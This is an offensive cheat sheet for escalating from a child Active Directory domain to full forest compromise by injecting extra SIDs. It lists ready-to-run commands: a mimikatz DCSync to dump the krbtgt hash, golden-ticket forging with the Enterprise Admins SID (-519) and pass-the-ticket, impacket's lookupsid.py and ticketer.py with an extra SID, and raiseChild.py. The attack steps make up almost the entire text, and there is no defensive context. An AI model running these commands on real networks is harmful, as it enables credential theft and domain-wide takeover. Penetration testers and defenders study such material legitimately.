# Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent)

#### 1) Golden Ticket

 - Get-DomainSID -Domain DOMAIN (Powerview)

 - Get-DomainSID -Domain TARGET_DOMAIN (Powerview)

 - mimikatz lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt

 - mimikatz kerberos::golden /user:Administrator /krbtgt:KRBTGT_HASH /domain:DOMAIN /sid:USER_SID /sids:ROOT_DOMAIN_SID-519 /ptt

## OR

 - lookupsid.py -domain-sids DOMAIN/USER:'PASSWORD'@DC_IP 0

 - ticketer.py -nthash CHILD_KRBTGT_HASH -domain-sid CHILD_SID -domain CHILD_DOMAIN -extra-sid PARENT_DOMAIN_SID-519 goldenuser

## OR

 - raiseChild.py DOMAIN/USER:'PASSWORD'

### With these attacks, we perform Pass-the-Ticket
